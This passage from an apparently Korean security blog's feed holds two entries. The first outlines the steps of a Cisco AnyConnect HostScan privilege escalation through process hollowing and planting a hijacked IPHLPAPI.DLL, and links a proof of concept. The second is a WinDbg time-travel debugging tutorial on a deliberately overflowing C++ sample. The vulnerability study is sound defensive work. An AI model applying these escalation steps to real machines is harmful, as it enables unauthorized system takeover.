&#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>libhostscan.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; <code>%TEMP%\Cisco\Cisco HostScan</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; <code>%ProgramFiles(x86)%\Cisco\Cisco HostScan\lib</code>&#xC774;&#xB098; <code>%ProgramFile(x86)%\Cisco\Cisco AnyConnect Secure Mobility Client\Posture</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC11C;&#xBE44;&#xC2A4;&#xC758; &#xC2E4;&#xD589; &#xD30C;&#xC77C;(ciscod.exe)&#xC744; &#xC77C;&#xC2DC; &#xC911;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC77C;&#xC2DC; &#xC911;&#xC9C0;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; <a href="https://attack.mitre.org/techniques/T1055/012/">process hollowing</a>&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC544;&#xB798;&#xC758; &#xC138; &#xBA85;&#xB839;&#xC5B4;&#xB97C; 127.0.0.1:1023&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.<ul><li><code>%TEMP%\Cisco\Cisco HostScan</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; <code>%PROGRAMFILES(x86)%\Cisco\Cisco HostScan\lib</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; <code>libhostscan.dll</code>&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; <code>priv_file_copy</code> &#xBA85;&#xB839;&#xC5B4;(&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; overwrite &#xB429;&#xB2C8;&#xB2E4;.)</li><li><code>%TEMP%\Cisco\Cisco HostScan</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; <code>PROGRAMFILES(x86)%\Cisco\Cisco HostScan\lib</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; DLL&#xC744; &#xBCF5;&#xC0AC;&#xD558;&#xB294; <code>priv_file_copy</code> &#xBA85;&#xB839;&#xC5B4;(&#xD574;&#xB2F9; DLL&#xC758; &#xC774;&#xB984;&#xC740; IPHLPAPI.DLL&#xC774;&#xACE0;, &#xC6D0;&#xBCF8; DLL&#xC758; export function&#xC744; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; export &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.)</li><li><code>priv_get_device_id</code> &#xBA85;&#xB839;&#xC5B4;</li></ul></li><li>&#xC77C;&#xC2DC; &#xC911;&#xC9C0; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>priv_file_copy</code> &#xBA85;&#xB839;&#xC5D0; &#xB514;&#xC9C0;&#xD138; &#xC11C;&#xBA85; &#xD655;&#xC778;&#xC744; &#xCD94;&#xAC00;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. POC&#xB294; <a href="https://www.coresecurity.com/core-labs/articles/analysis-cisco-anyconnect-posture-hostscan-local-privilege-escalation-cve-2021">coresecurity &#xBE14;&#xB85C;&#xADF8;&#xC758; &#xD574;&#xB2F9; &#xAC8C;&#xC2DC;&#xAE00;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>idioth</tag>
      
      <tag>process hollowing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 시간을 여행하는 해커를 위한 안내서 Part2</title>
    <link href="/2021/02/21/fabu1ous/ttd-2/"/>
    <url>/2021/02/21/fabu1ous/ttd-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-II-&#xB450;&#xB465;-&#xB4F1;&#xC7A5;"><a href="#Part-II-&#xB450;&#xB465;-&#xB4F1;&#xC7A5;" class="headerlink" title="Part II &#xB450;&#xB465; &#xB4F1;&#xC7A5;"></a>Part II &#xB450;&#xB465; &#xB4F1;&#xC7A5;</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/1.png" alt></p><p>&#xC2DC;&#xAC04;&#xC744; &#xC5EC;&#xD589;&#xD558;&#xB294; &#xD574;&#xCEE4;&#xB97C; &#xC704;&#xD55C; &#xC548;&#xB0B4;&#xC11C; Part 1&#xC5D0;&#xC11C; Windbg TTD&#xB97C; &#xAC04;&#xB2E8;&#xD788; &#xC0B4;&#xD3B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; Part 2&#xC5D0;&#xC120; TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAC04;&#xB2E8;&#xD55C; &#xBC84;&#xADF8;&#xC758; root cause&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xBA74;&#xC11C; TTD&#xC640; &#xCE5C;&#xD574;&#xC838; &#xBD05;&#xC2DC;&#xB2E4;. Windbg&#xB97C; &#xD55C; &#xBC88;&#xB3C4; &#xC548; &#xC368;&#xBCF4;&#xC168;&#xAC70;&#xB098; Part 1&#xC744; &#xBCF4;&#xACE0; &#xC2F6;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; <a href="https://hackyboiz.github.io/2021/01/24/fabu1ous/ttd-1/">Part 1</a>&#xC744; &#xBCF4;&#xACE0; &#xC624;&#xC138;&#xC694;.</p><p>&#xCD5C;&#xADFC;&#xC5D0; L0ch&#xD615;&#xC774; &#xAE00; &#xC870;&#xD68C;&#xC218;&#xB85C; &#xC808; &#xB180;&#xB9AC;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xB3C4;&#xC640;&#xC8FC;&#xC2ED;&#xC1FC;. &#x314E;&#x314E;</p><h1 id="&#xC900;&#xBE44;&#xBB3C;-&#xD544;&#xC218;"><a href="#&#xC900;&#xBE44;&#xBB3C;-&#xD544;&#xC218;" class="headerlink" title="&#xC900;&#xBE44;&#xBB3C;(&#xD544;&#xC218;)"></a>&#xC900;&#xBE44;&#xBB3C;(&#xD544;&#xC218;)</h1><ol><li>visual studio</li><li>windbg preview</li><li>&#xB9AC;&#xBC84;&#xC2F1; &#xCC98;&#xC74C; &#xD574;&#xBCF4;&#xB294; &#xCC99;&#xD560; &#xC218; &#xC788;&#xB294; &#xC5F0;&#xAE30;&#xB825;</li></ol><h1 id="&#xC0D8;&#xD50C;-&#xB9CC;&#xB4E4;&#xAE30;"><a href="#&#xC0D8;&#xD50C;-&#xB9CC;&#xB4E4;&#xAE30;" class="headerlink" title="&#xC0D8;&#xD50C; &#xB9CC;&#xB4E4;&#xAE30;"></a>&#xC0D8;&#xD50C; &#xB9CC;&#xB4E4;&#xAE30;</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/2.png" alt></p><p>Visual studio&#xB85C; C++ &#xCF58;&#xC194; app&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xC2E4;&#xC2B5; &#xC0D8;&#xD50C;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC758; &#xC774;&#xB984; &#xBC0F; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC740; ttd_part2&#xB85C; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetCppConGreeting</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* <span class="hljs-built_in">buffer</span>, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">wchar_t</span> <span class="hljs-keyword">const</span>* <span class="hljs-keyword">const</span> message = <span class="hljs-string">L&quot;HELLO FROM THE WINDBG TEAM. GOOD LUCK IN ALL OF YOUR TIME TRAVEL DEBUGGING!&quot;</span>;    wcscpy_s(<span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>, message);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span> &lt;<span class="hljs-keyword">wchar_t</span>, 50&gt; greeting{};    GetCppConGreeting(greeting.data(), <span class="hljs-keyword">sizeof</span>(greeting));    wprintf(<span class="hljs-string">L&quot;%ls\\n&quot;</span>, greeting.data());    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC2E4;&#xC2B5;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xBC84;&#xADF8;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. greeting.data()&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xB300;&#xCDA9; &#xCF54;&#xB4DC;&#xB9CC; &#xBD10;&#xB3C4; &#xC5B4;&#xB5A4; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD560;&#xC9C0; &#xB290;&#xB08C;&#xC774; &#xC624;&#xC9C0;&#xB9CC; &#xAC00;&#xBCCD;&#xAC8C; &#xBB34;&#xC2DC;&#xD569;&#xC2DC;&#xB2E4;.</p><blockquote><p>Part2&#xB294; &#xC2E0;&#xBE44;&#xC8FC;&#xC758;&#xC57C;! Part2&#xB294; &#xD63C;&#xC790;&#xBC16;&#xC5D0; &#xC0DD;&#xAC01;&#xD558;&#xC9C0; &#xC54A;&#xC544;!</p><p>-&#xC774;&#xADFC;-</p></blockquote><p><img src="/2021/02/21/fabu1ous/ttd-2/3.png" alt></p><p>&#xC6B0;&#xC120; &#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xAE30; &#xC804;, &#xC2E4;&#xC2B5;&#xC5D0; &#xBC29;&#xD574;&#xB418;&#xB294; &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xACFC; &#xBCF4;&#xC548;&#xC124;&#xC815;&#xC744; &#xAEBC;&#xC90D;&#xC2DC;&#xB2E4;.</p><p>&#xC0C1;&#xB2E8; &#xBA54;&#xB274; &gt; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &gt; &#xC18D;&#xC131; &gt; C/C++ &gt; SDL &#xAC80;&#xC0AC; &gt; &#xC544;&#xB2C8;&#xC694;(/sdl-)</p><p><img src="/2021/02/21/fabu1ous/ttd-2/4.png" alt></p><p>&#xC0C1;&#xB2E8; &#xBA54;&#xB274; &gt; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &gt; &#xC18D;&#xC131; &gt; C/C++ &gt; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;</p><ul><li>&#xAE30;&#xBCF8; &#xB7F0;&#xD0C0;&#xC784; &#xAC80;&#xC0AC; : &#xAE30;&#xBCF8;&#xAC12;</li><li>&#xBCF4;&#xC548; &#xAC80;&#xC0AC; : &#xBCF4;&#xC548; &#xAC80;&#xC0AC; &#xC0AC;&#xC6A9; &#xC548;&#xD568; (/GS-)</li></ul><p><img src="/2021/02/21/fabu1ous/ttd-2/build.png" alt></p><p>&#xC0C1;&#xB2E8; &#xBA54;&#xB274; &gt; &#xBE4C;&#xB4DC; &gt; &#xC194;&#xB8E8;&#xC158; &#xBE4C;&#xB4DC;</p><p>&#xBE4C;&#xB4DC; &#xD6C4; ttd_part2.exe&#xB97C; &#xC2E4;&#xD589;&#xD574; &#xBCF4;&#xBA74; &#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; &#xBB38;&#xC790;&#xC5F4; &#xD558;&#xB098;&#xAC00; &#xCD9C;&#xB825;&#xB429;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC2B5; &#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; Exception&#xC774;&#xB098; Crash&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB2E4;&#xB294; &#xBA54;&#xC138;&#xC9C0; &#xBC15;&#xC2A4;&#xAC00; &#xB730; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/5.png" alt></p><p>Windbg Preview&#xB97C; tdd_part2.exe&#xC5D0; &#xBD99;&#xC5EC;&#xC11C; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; Access violation&#xC774; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; EIP&#xAC00; &#xC624;&#xC5FC;&#xB3FC; &#xC788;&#xAD70;&#xC694;. </p><h1 id="Trace-File-&#xB9CC;&#xB4E4;&#xAE30;"><a href="#Trace-File-&#xB9CC;&#xB4E4;&#xAE30;" class="headerlink" title="Trace File &#xB9CC;&#xB4E4;&#xAE30;"></a>Trace File &#xB9CC;&#xB4E4;&#xAE30;</h1><p><img src="/2021/02/21/fabu1ous/ttd-2/6.png" alt></p><p>Windbg Preview (&#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;) &gt; &#xD30C;&#xC77C; &gt; Launch executable (advanced) &gt;</p><p>&#xD0C0;&#xAC9F;(ttd_part2.exe) &#xC120;&#xD0DD; &gt; Record with TTD &#xCCB4;&#xD06C; &gt; Configuer and Record</p><p>&#xC774;&#xC81C; &#xB9CC;&#xB4E4;&#xC5B4;&#xB454; &#xC0D8;&#xD50C;&#xB85C; &#xBCF8;&#xACA9;&#xC801;&#xC778; &#xC2E4;&#xC2B5;&#xC744; &#xC2DC;&#xC791;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;. TTD&#xC0AC;&#xC6A9;&#xC758; &#xCCAB; &#xB2E8;&#xACC4;&#xC778; Trace File &#xB179;&#xD654;&#xB97C; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/7.png" alt></p><p>Part 1&#xC5D0;&#xC11C; &#xC800; Record &#xBC84;&#xD2BC;&#xC744; &#xB204;&#xB974;&#xACE0; &#xCD5C;&#xB300;&#xD55C; &#xBE68;&#xB9AC; &#xBD84;&#xC11D;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xC774;&#xC288;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C;&#xC57C; &#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC5C8;&#xC8E0;? ttd_part2.exe&#xB294; &#xC2E4;&#xD589;&#xB9CC; &#xC2DC;&#xCF1C;&#xB3C4; &#xD06C;&#xB798;&#xC26C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Record &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC; &#xC8FC;&#xC2DC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xB531;&#xD788; &#xCD94;&#xAC00;&#xB85C; &#xC2E0;&#xACBD; &#xC368; &#xC904;&#xAC8C; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/02/21/fabu1ous/ttd-2/8.png" alt></p><p>&#xB179;&#xD654;&#xAC00; &#xB05D;&#xB098;&#xACE0; TTD&#xAC00; Trace file(<code>.run</code>)&#xC5D0; &#xB300;&#xD55C; IDX file(.idx)&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xB098;&#xBA74; &#xBD84;&#xC11D; &#xC900;&#xBE44; &#xB05D;!</p><h1 id="Trace-File-&#xBD84;&#xC11D;&#xD558;&#xAE30;"><a href="#Trace-File-&#xBD84;&#xC11D;&#xD558;&#xAE30;" class="headerlink" title="Trace File &#xBD84;&#xC11D;&#xD558;&#xAE30;"></a>Trace File &#xBD84;&#xC11D;&#xD558;&#xAE30;</h1><pre><div class="caption"><span>text</span></div><code class="hljs plain">dx -r1 @$curprocess.TTD.Events</code></pre><p>dx &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; Trace File&#xC5D0; &#xB179;&#xD654;&#xB41C; &#xBAA8;&#xB4E0; &#xC774;&#xBCA4;&#xD2B8; &#xBAA9;&#xB85D;&#xC744; &#xD655;&#xC778;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;. tdd_part2.exe&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xD07C;&#xC9C1; &#xD07C;&#xC9C1;&#xD55C; &#xC0AC;&#xAC74;&#xB4E4;&#xC744; &#xD55C;&#xB208;&#xC5D0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; Exception&#xC774; &#xB208;&#xC5D0; &#xB744;&#xB124;&#xC694;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/9.png" alt></p><p>&#xC88C;&#xCE21;&#xC5D0; &#xC788;&#xB294; Index(<code>[0x9]</code>)&#xB97C; &#xD074;&#xB9AD;&#xD574; Exception&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xCD9C;&#xB825;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/10.png" alt></p><p>Time Travel Position, Exception Code, Exception Type &#xB4F1; Exception&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xCD9C;&#xB825;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xAC00; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xB294; &#xC774;&#xC288;&#xB294; Program Counter&#xAC00; <code>0x540020</code>&#xC77C; &#xB54C; CPU&#xAC00; &#xB358;&#xC9C4; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; Exception&#xC73C;&#xB85C; Access Violation&#xC5D0; &#xD574;&#xB2F9;&#xD568;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xAE08; &#xB354; &#xC790;&#xC138;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC6D0;&#xD558;&#xC2DC;&#xBA74; Exception &#xD544;&#xB4DC;&#xB97C; &#xD074;&#xB9AD;&#xD574; Flag, RecordAddress &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB3C4; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/10-1.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">!tt ce:0</code></pre><p>[ Time Travel ]&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xAC70;&#xB098; <code>!tt</code>&#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD574;&#xB2F9; Exception&#xC774; &#xBC1C;&#xC0DD;&#xD55C; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD574; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/12.png" alt></p><p>&#xBC84;&#xADF8;&#xB098; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xB300;&#xBD80;&#xBD84; &#xC81C;&#xC77C; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xAC74; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xB208;&#xC5D0; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xAC8C; 2&#xAC00;&#xC9C0; &#xC788;&#xB124;&#xC694;.</p><ol><li>EIP(Program Counter)&#xC758; &#xC704;&#xCE58;&#xAC00; &#xC774;&#xC0C1;&#xD558;&#xB2E4;.</li><li>ESP&#xC640; EBP&#xC758; &#xAC70;&#xB9AC;&#xAC00; &#xB108;&#xBB34; &#xBA40;&#xB2E4;.</li></ol><p>&#xD06C;&#xB798;&#xC26C; &#xC2DC;&#xC810;&#xC774; root cause&#xC77C;&#xB9AC; &#xC5C6;&#xC73C;&#xB2C8; EIP&#xAC00; &#xC624;&#xC5FC;&#xB418;&#xAE30; &#xC804;&#xC73C;&#xB85C; &#xB418;&#xB3CC;&#xB9AC;&#xBA74;&#xC11C; root cause&#xB97C; &#xCC3E;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>&#xB124;?  &#xC800; &#xB450; &#xAC1C;&#xB9CC; &#xBD10;&#xB3C4; &#xC2A4;&#xD0DD; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xC778; &#xAC70; &#xC54C; &#xAC70; &#xAC19;&#xB2E4;&#xACE0;&#xC694;? &#xAE00; &#xCD08;&#xBC18;&#xBD80;&#xC5D0; &#xC801;&#xC5B4; &#xB193;&#xC740; 3&#xBC88;&#xC9F8; &#xC900;&#xBE44;&#xBB3C;&#xC744; &#xB2E4;&#xC2DC; &#xC900;&#xBE44;&#xD574;&#xC624;&#xC2DC;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/13.png" alt></p><p>Part 1&#xC5D0;&#xC11C; &#xB2E4;&#xB918;&#xB358; &#xAC83;&#xCC98;&#xB7FC; TTD&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xD589;&#xC744; &#xB418;&#xB3CC;&#xB9AC;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB9CE;&#xC9C0;&#xB9CC; &#x201C;&#xCC9C; &#xB9AC; &#xAE38;&#xB3C4; &#xD55C; &#xAC78;&#xC74C; &#xBD80;&#xD130;&#x201D;&#xB77C;&#xB294; &#xB9D0;&#xC774; &#xC788;&#xB4EF;&#xC774; &#xC6B0;&#xC120; Step Into Back(&#xBA85;&#xB839;&#xC5B4; &#x201C;t-&#x201C;)&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD55C; &#xAC78;&#xC74C;(Step)&#xC529; &#xB418;&#xAC10;&#xC544; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/14.png" alt></p><p>&#xD5C8;&#xD5C8;&#x2026; &#xC2DC;&#xC791;&#xC774; &#xBC18;&#xC774;&#xB77C;&#xACE0; &#xD06C;&#xB798;&#xC26C; &#xC9C1;&#xC804;&#xC5D0; &#xC2E4;&#xD589;&#xD55C; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; <code>main()</code>&#xC758; ret&#xC774;&#xB124;&#xC694;. EIP&#xAC00; &#xC624;&#xC5FC;&#xB41C; &#xC774;&#xC720;&#xB97C; &#xCC3E;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC8C;&#xC368; &#xBD84;&#xC11D; &#xB2E4;&#xD55C; &#xAC70; &#xAC19;&#xC740; &#xC774; &#xAE30;&#xBD84;! &#xB108;&#xBB34; &#xD640;&#xAC00;&#xBD84;&#xD558;&#xAD70;&#xC694;.</p><blockquote><p>&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xAC8C;&#xB294; &#xC791;&#xC740; &#xD55C; &#xAC78;&#xC74C;&#xC774;&#xC9C0;&#xB9CC; &#xB9AC;&#xBC84;&#xC11C;&#xC5D0;&#xAC8C;&#xB294; &#xC704;&#xB300;&#xD55C; &#xB3C4;&#xC57D;&#xC774;&#xB2E4;.</p><p>-&#xB2D0; &#xC554;&#xC2A4;&#xD2B8;&#xB871;-</p></blockquote><p>&#xC544;&#xB9C8; ESP&#xC640; EBP&#xC758; &#xAC70;&#xB9AC;&#xAC00; &#xBA3C; &#xC774;&#xC720;&#xB3C4; <code>main()</code>&#xC758; &#xC5D0;&#xD544;&#xB85C;&#xADF8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB2E4;&#xAC00; EBP&#xAC00; &#xC774;&#xC0C1;&#xD55C; &#xC704;&#xCE58;&#xB85C; &#xD280;&#xC5B4;&#xBC84;&#xB9B0;&#xAC70;&#xACA0;&#xC8E0;?</p><p><img src="/2021/02/21/fabu1ous/ttd-2/15.png" alt></p><p>Step Into Back(&#x201C;t-&#x201C;)&#xC744; 2&#xBC88; &#xB354; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C;&#xC57C; EBP &#xC704;&#xCE58;&#xAC00; &#xB9D0;&#xC774; &#xB418;&#xB124;&#xC694;.</p><p><img src="/2021/02/21/fabu1ous/ttd-2/16.png" alt></p><pre><div class="caption"><span>text</span></div><code class="hljs plain">dc ebp</code></pre><p>ebp &#xC704;&#xCE58;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xD0DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; SFP&#xC640; RET &#xAC12;&#xC774; &#xCD9C;&#xB825; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xC624;&#xC5FC;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xBA85;&#xD788; <code>main()</code> &#xC5B4;&#xB518;&#xAC00;&#xC5D0;&#xC11C; &#xCD9C;&#xB825; &#xBA54;&#xC138;&#xC9C0;&#xAC00; stack&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xD0A8;&#xB2E4;&#xB294; &#xAC78; &#xC54C;&#xC558;&#xC73C;&#xB2C8; &#xADF8; &#xC774;&#xC720;&#xB97C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><div class="caption"><span>text</span></div><code class="hljs plain">ba &lt;access&gt; &lt;size&gt; &lt;address&gt; {option}</code></pre><p>&#xBC29;&#xAE08;&#xAE4C;&#xC9C0; &#xAC77;&#xB294; &#xBC95;&#xC744; &#xC54C;&#xC544;&#xBD24;&#xC73C;&#xB2C8; &#xC774;&#xC820; Breakpoint&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB6F0;&#xB294; &#xBC95;&#xC744; &#xBC30;&#xC6CC;&#xBD05;&#xC2DC;&#xB2E4;. Windbg&#xC758; breakpoint&#xB294; &#xD2B9;&#xC815; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xAC78;&#xB9AC;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>e : Execute</li><li>r : Read or Write</li><li>w : Write</li></ul><p>&#xD604;&#xC7AC; EBP&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;(&#xC800;&#xC758; 